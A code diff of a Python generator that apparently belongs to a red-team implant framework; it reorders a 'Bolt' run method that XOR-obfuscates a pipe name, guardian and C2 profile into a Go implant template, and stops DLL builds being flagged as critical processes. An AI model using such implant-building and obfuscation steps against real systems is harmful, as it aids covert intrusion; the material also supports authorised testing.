@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-# Copyright (C) 2021 - 2022 iDigitalFlame
+# Copyright (C) 2020 - 2022 iDigitalFlame
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -120,37 +120,6 @@ class Bolt(object):
     def args_post(self, cfg, args):
         self._m.parse(cfg, args)
 
-    def run(self, cfg, base, _, templates):
-        k = token_bytes(64)
-        e = _LINKERS[cfg["linker"]]
-        p = xor(k, cfg["pipe"].encode("UTF-8"))
-        g = xor(k, cfg["guardian"].encode("UTF-8"))
-        n = xor(k, Config.from_file(expandvars(expanduser(cfg["profile"]))))
-        t = "bolt.go"
-        if cfg["service"] and nes(cfg["service_name"]):
-            t = "bolt_service.go"
-        c = cfg["checks"]
-        if not nes(c):
-            c = "false"
-        d = templates[t].substitute(
-            checks=c,
-            event=f'"{e}"',
-            key=go_bytes(k),
-            pipe=go_bytes(p),
-            guard=go_bytes(g),
-            profile=go_bytes(n),
-            service=f'"{cfg["service_name"]}"',
-            load="true" if cfg["load"] else "false",
-            ignore="true" if cfg["ignore"] else "false",
-            critical="true" if cfg["critical"] else "false",
-        )
-        del k, e, p, g, n, t
-        p = join(base, "bolt.go")
-        with open(p, "w") as f:
-            f.write(d)
-        del d
-        return p
-
     def print_options(self, cfg, root, file):
         print("- | Bolt Generator", file=file)
         print(f'- | = {"Profile:":20}{cfg["profile"]}', file=file)
@@ -175,6 +144,42 @@ class Bolt(object):
             print(f'- | = {"CGO Func:":20}{cfg["func"]}', file=file)
         else:
             print(f'- | = {"CGO Func:":20}[random]', file=file)
+
+    def run(self, cfg, base, workspace, templates):
+        k = token_bytes(64)
+        e = _LINKERS[cfg["linker"]]
+        p = xor(k, cfg["pipe"].encode("UTF-8"))
+        g = xor(k, cfg["guardian"].encode("UTF-8"))
+        n = xor(k, Config.from_file(expandvars(expanduser(cfg["profile"]))))
+        t = "bolt.go"
+        if cfg["service"] and nes(cfg["service_name"]):
+            t = "bolt_service.go"
+        c = cfg["checks"]
+        if not nes(c):
+            c = "false"
+        d = templates[t].substitute(
+            checks=c,
+            event=f'"{e}"',
+            key=go_bytes(k),
+            pipe=go_bytes(p),
+            guard=go_bytes(g),
+            profile=go_bytes(n),
+            service=f'"{cfg["service_name"]}"',
+            load="true" if cfg["load"] else "false",
+            ignore="true" if cfg["ignore"] else "false",
+            critical="true"
+            if cfg["critical"] and not workspace["library"] and cfg["service"]
+            else "false",
+            # BUG(dij): Let's NOT set DLL files as critical for now. We can't
+            #           control how they /exactly/ handle injection so we don't
+            #           want to leave systems crashing.
+        )
+        del k, e, p, g, n, t
+        p = join(base, "bolt.go")
+        with open(p, "w") as f:
+            f.write(d)
+        del d
+        return p
 
     def run_cgo(self, export, cfg, base, workspace, templates):
         t = "bolt.c"
